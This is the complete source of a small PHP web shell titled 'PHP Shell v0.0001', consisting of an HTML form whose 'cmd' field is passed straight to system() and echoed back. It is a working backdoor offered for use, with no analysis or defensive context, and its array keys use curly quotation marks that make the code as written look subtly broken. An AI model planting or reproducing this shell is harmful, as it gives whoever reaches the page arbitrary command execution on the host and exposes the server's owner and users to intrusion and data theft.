<html>
<head></head>
<body>
<pre>
[red.cow.cat]   [PHP Shell v0.0001]
[All credits to a lot of people all over the internet ¬¬']
</pre>
<br>
<form method="GET" name="myform">
	<input type="text" name="cmd" />
	<input type="submit" value="Execute" />
</form>
<?php
if(isset($_REQUEST[‘cmd’])){
	echo "<pre>";
	$cmd = ($_REQUEST[‘cmd’]);
	system($cmd);
	echo "</pre>";
	die;
}
?>
</body>
</html>
